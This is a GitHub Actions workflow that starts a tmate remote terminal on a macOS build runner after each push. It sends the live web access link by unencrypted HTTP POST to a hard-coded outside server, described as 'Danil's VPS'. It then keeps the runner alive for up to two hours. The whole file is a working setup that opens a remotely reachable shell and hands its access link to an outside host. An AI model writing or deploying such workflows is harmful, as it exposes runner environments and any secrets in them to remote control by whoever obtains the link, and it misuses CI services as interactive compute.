name: macOS Interactive Session

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  interactive:
    runs-on: macos-15
    steps:
      - name: Launch Interactive macOS Session
        run: |
          brew install tmate
          tmate -S /tmp/tmate.sock new-session -d
          tmate -S /tmp/tmate.sock wait tmate-ready
          
          WEB_URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')
          SSH_CMD=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
          
          echo "WEB: $WEB_URL"
          echo "SSH: $SSH_CMD"
          
          # Report directly to Danil's VPS
          curl -s -X POST -d "$WEB_URL" http://195.96.132.171:8999/ || true
          
          for i in {1..720}; do
            if [ ! -S /tmp/tmate.sock ]; then break; fi
            sleep 10
          done
